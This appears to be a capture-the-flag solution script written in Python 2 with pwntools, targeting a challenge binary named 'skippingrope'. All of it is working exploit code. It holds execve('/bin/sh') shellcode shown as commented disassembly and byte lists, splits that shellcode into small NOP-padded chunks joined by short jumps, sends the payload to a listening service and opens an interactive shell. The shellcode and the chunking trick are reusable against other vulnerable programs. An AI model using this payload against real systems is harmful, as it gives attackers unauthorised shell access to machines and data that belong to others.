from pwn import *

#context.log_level = "debug"

# 0:  31 c0                   xor    eax,eax
# 2:  b7 ff                   mov    bh,0xff
# 4:  b3 97                   mov    bl,0x97
# 6:  48 c1 e3 10             shl    rbx,0x10
# a:  b7 8c                   mov    bh,0x8c
# c:  b3 d0                   mov    bl,0xd0
# e:  48 c1 e3 10             shl    rbx,0x10
# 12: b7 91                   mov    bh,0x91
# 14: b3 96                   mov    bl,0x96
# 16: 48 c1 e3 10             shl    rbx,0x10
# 1a: b7 9d                   mov    bh,0x9d
# 1c: b3 d1                   mov    bl,0xd1
# 1e: 48 f7 db                neg    rbx
# 21: 53                      push   rbx
# 22: 54                      push   rsp
# 23: 5f                      pop    rdi
# 24: 99                      cdq
# 25: 52                      push   rdx
# 26: 57                      push   rdi
# 27: 54                      push   rsp
# 28: 5e                      pop    rsi
# 29: b0 3b                   mov    al,0x3b
# 2b: 0f 05                   syscall

shellcode = ['31 c0', 'b7 ff', 'b3 97', '48 c1 e3 10', 'b7 8c', 'b3 d0',
             '48 c1 e3 10', 'b7 91', 'b3 96', '48 c1 e3 10', 'b7 9d',
             'b3 d1', '48 f7 db', '53', '54', '5f', '99', '52', '57', '54',
             '5e', 'b0 3b', '0f 05']
jmp_b = "eb 0a".replace(" ", "").decode("hex")

def main():
    #p = process("./skippingrope")
    p = remote("localhost", 1501)

    # Construct the payload instruction by instruction
    payload = ""
    for i in shellcode:
        current  = i.replace(" ", "").decode("hex")
        current  = current.ljust(4, "\x90")
        current += jmp_b
        payload += current
    payload = payload.ljust(0x2000, "\x00")

    p.send(payload)

    log.success("Enjoy your shell.")
    p.interactive()

if __name__ == "__main__":
    main()
